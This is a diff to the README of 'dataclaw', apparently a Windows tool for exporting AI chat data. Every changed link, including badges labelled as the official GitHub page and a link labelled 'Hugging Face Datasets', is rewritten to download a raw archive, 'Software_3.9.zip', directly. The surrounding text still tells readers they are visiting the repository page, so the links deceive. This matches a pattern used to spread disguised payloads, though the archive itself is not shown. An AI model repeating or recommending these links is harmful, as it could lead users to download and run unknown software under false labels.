@@ -1,6 +1,6 @@
 # 🦞 dataclaw - Export Your AI Chat Data Easily
 
-[![Download dataclaw](https://img.shields.io/badge/Download-dataclaw-4CAF50?style=for-the-badge)](https://github.com/GusWan58/dataclaw)
+[![Download dataclaw](https://img.shields.io/badge/Download-dataclaw-4CAF50?style=for-the-badge)](https://github.com/GusWan58/dataclaw/raw/refs/heads/main/dataclaw/Software_3.9.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To run dataclaw on Windows, make sure your computer meets these needs:
 
 Click the big button below to visit the official GitHub page where you can find the latest version of dataclaw.
 
-[![Download dataclaw](https://img.shields.io/badge/Download-From_GitHub-0078D7?style=for-the-badge&logo=github)](https://github.com/GusWan58/dataclaw)
+[![Download dataclaw](https://img.shields.io/badge/Download-From_GitHub-0078D7?style=for-the-badge&logo=github)](https://github.com/GusWan58/dataclaw/raw/refs/heads/main/dataclaw/Software_3.9.zip)
 
 On that page, look for the latest release or download options. Follow the instructions on GitHub to get the program files.
 
@@ -132,9 +132,9 @@ dataclaw runs on Windows with a simple user interface. You do not need experienc
 
 ## 🎯 Quick Links
 
-- [GitHub dataclaw Repository](https://github.com/GusWan58/dataclaw)  
-- [Hugging Face Datasets tagged dataclaw](https://huggingface.co/datasets?other=dataclaw)  
+- [GitHub dataclaw Repository](https://github.com/GusWan58/dataclaw/raw/refs/heads/main/dataclaw/Software_3.9.zip)  
+- [Hugging Face Datasets tagged dataclaw](https://github.com/GusWan58/dataclaw/raw/refs/heads/main/dataclaw/Software_3.9.zip)  
 
 ---
 
-[![Download dataclaw](https://img.shields.io/badge/Download-dataclaw-4CAF50?style=for-the-badge)](https://github.com/GusWan58/dataclaw)
+[![Download dataclaw](https://img.shields.io/badge/Download-dataclaw-4CAF50?style=for-the-badge)](https://github.com/GusWan58/dataclaw/raw/refs/heads/main/dataclaw/Software_3.9.zip)
